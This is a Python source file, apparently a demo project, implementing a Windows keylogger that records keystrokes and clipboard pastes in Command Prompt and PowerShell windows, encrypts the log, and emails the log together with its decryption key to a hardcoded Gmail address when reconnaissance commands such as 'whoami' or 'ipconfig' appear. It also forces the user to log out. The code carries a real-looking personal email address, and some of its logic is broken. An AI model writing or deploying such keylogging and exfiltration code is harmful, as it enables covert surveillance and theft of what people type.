# Final code 

import os
import datetime
from pynput import keyboard
import win32gui
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import configparser
import pyperclip
import time
import subprocess  # For blocking users on Windows
from cryptography.fernet import Fernet

class Keylogger:
    def __init__(self, output_file=None):
        # Initializing the Keylogger class with default parameters
        self.output_file = output_file or "keystroke_log.txt"
        self.encrypted_file = self.output_file + ".enc"
        self.key_file = "encryption_key.key"
        self.current_word = ""
        self.exact_strings = ['ipconfig', 'whoami', 'netuser', 'systeminfo']
        self.pasted_strings = []
        self.pasting = False
        self.current_command = ""
        self.blocked_users = "blocked_users.txt"  # File to store blocked users
        self.unblock_combination = {keyboard.Key.ctrl_l, keyboard.Key.shift_l, keyboard.KeyCode(char='u')}
        self.current_keys = set()

        self.user_roles = {
            'rohit': 'administrator',
            'asus': 'accounting',
            'prathamesh': 'networker',
            'kunika': 'BPS',
            'guest1': 'Guest'
        }

        self.config = configparser.ConfigParser()
        self.config.read(os.path.join(os.path.dirname(__file__), 'C:/Users/Rohit/OneDrive/Desktop/Demo_keyLogger/config.ini'))
        self.sender_email = self.config.get('Email', 'sender_email')
        self.sender_password = self.config.get('Email', 'sender_password')
        self.recipient_email = "khp0901@gmail.com"

        # Load or generate encryption key
        self.key = self.load_or_generate_key()

    def load_or_generate_key(self):
        if os.path.exists(self.key_file):
            with open(self.key_file, 'rb') as file:
                key = file.read()
        else:
            key = Fernet.generate_key()
            with open(self.key_file, 'wb') as file:
                file.write(key)
        return key

    def encrypt_file(self, file_path, encrypted_path, key):
        cipher = Fernet(key)
        with open(file_path, 'rb') as file:
            file_data = file.read()
        encrypted_data = cipher.encrypt(file_data)
        with open(encrypted_path, 'wb') as file:
            file.write(encrypted_data)

    def get_user_role(self, username):
        username = username.lower()
        return self.user_roles.get(username, None)

    def block_user(self, user):
        print(f"User {user} is blocked. Taking action.")
        try:
            # Log out the user using shutdown command with administrative privileges
            subprocess.run(["shutdown", "/l"], check=True)
            print("User logged out successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Error logging out user {user}: {e}")
        except Exception as e:
            print(f"Failed to log out user {user}: {e}")

    def unblock_user(self, user):
        if user in self.blocked_users:
            self.blocked_users.remove(user)
            print(f"User {user} has been unblocked.")

    def on_press(self, key):
        self.current_keys.add(key)
        if self.unblock_combination.issubset(self.current_keys):
            user = os.getenv('USERNAME')
            self.unblock_user(user)
        try:
            active_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if 'Command Prompt' in active_window_title or 'PowerShell' in active_window_title:
                current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                user = os.getenv('USERNAME')
                keystroke = self.get_key_str(key)
                word_phrase = self.get_word_phrase(keystroke)

                log_entry = ""

                if not self.file_exists():
                    headers = "Timestamp\t User\t Keystroke\t Word/Phrase\n"
                    with open(self.output_file, "a") as f:
                        f.write(headers)

                if keystroke == 'ENTER':
                    if self.match_exact_string(self.current_command):
                        self.send_email(self.current_command, user)
                    self.current_command = ""

                if keystroke not in ['SPACE', 'ENTER']:
                    self.current_command += keystroke

                log_entry = f"{current_time}\t{user}\t{keystroke}\t{word_phrase}\n"
                with open(self.output_file, "a") as f:
                    f.write(log_entry)

                # Encrypt the log file after logging a keystroke
                self.encrypt_file(self.output_file, self.encrypted_file, self.key)

        except Exception as e:
            print(f"Error: {e}")

    def match_exact_string(self, word_phrase):
        return word_phrase in self.exact_strings

    def get_word_phrase(self, keystroke):
        if keystroke == 'SPACE':
            self.current_word += ""
        elif keystroke == 'ENTER':
            word_phrase = self.current_word + '\n'
            self.current_word = ""
            return word_phrase
        else:
            self.current_word += keystroke
            return self.current_word

    def get_key_str(self, key):
        if hasattr(key, 'char'):
            return key.char
        elif key == keyboard.Key.space:
            return 'SPACE'
        elif key == keyboard.Key.enter:
            return 'ENTER'
        else:
            return f"[{key}]"

    def file_exists(self):
        try:
            with open(self.output_file, "r") as f:
                content = f.read()
                return bool(content.strip())
        except FileNotFoundError:
            return False

    def send_email(self, word_phrase, user):
        msg = MIMEMultipart()
        msg['From'] = self.sender_email
        msg['To'] = self.recipient_email
        msg['Subject'] = f"Malicious Activity detected"
        role = self.get_user_role(user)
        body = f"User: {user}\nRole: {role}\nUse of sensitive string found: {word_phrase}"
        msg.attach(MIMEText(body, 'plain'))

        # Attach the encrypted log file
        attachment = MIMEBase('application', 'octet-stream')
        with open(self.encrypted_file, 'rb') as file:
            print("Encryped Log File Send")
            attachment.set_payload(file.read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(self.encrypted_file)}')
        
        msg.attach(attachment)

        # Attach the encryption key file
        key_attachment = MIMEBase('application', 'octet-stream')
        with open(self.key_file, 'rb') as file:
            print("Encryption Key File Send")
            key_attachment.set_payload(file.read())
        encoders.encode_base64(key_attachment)
        key_attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(self.key_file)}')
        
        msg.attach(key_attachment)

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.sender_email, self.sender_password)
            text = msg.as_string()
            user = os.getenv('USERNAME')
            role = self.get_user_role(user)

            if role == 'accounting' or role == 'BPS':
                server.sendmail(self.sender_email, self.recipient_email, text)
                print("Email sent successfully")
            else:
                print("Email not sent.")
            server.quit()
        except Exception as e:
            print(f"Error sending email: {e}")

    def on_clipboard_change(self):
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            active_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if 'Command Prompt' in active_window_title or 'PowerShell' in active_window_title:
                if clipboard_content not in self.pasted_strings and self.match_exact_string(clipboard_content):
                    self.pasted_strings.append(clipboard_content)
                    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    user = os.getenv('USERNAME')
                    log_entry = f"{current_time}\t{user}\tPASTE\t{clipboard_content}\n"
                    with open(self.output_file, "a") as f:
                        f.write(log_entry)
                    self.send_email(clipboard_content, user)

                    # Encrypt the log file after logging clipboard content
                    self.encrypt_file(self.output_file, self.encrypted_file, self.key)

    def start_logging(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            while True:
                time.sleep(1)
                self.on_clipboard_change()

    def on_release(self, key):
        if key in self.current_keys:
            self.current_keys.remove(key)

if __name__ == "__main__":
    output_file = "keystroke_log.txt"
    print("Started")
    keylogger = Keylogger(output_file)
    keylogger.start_logging()
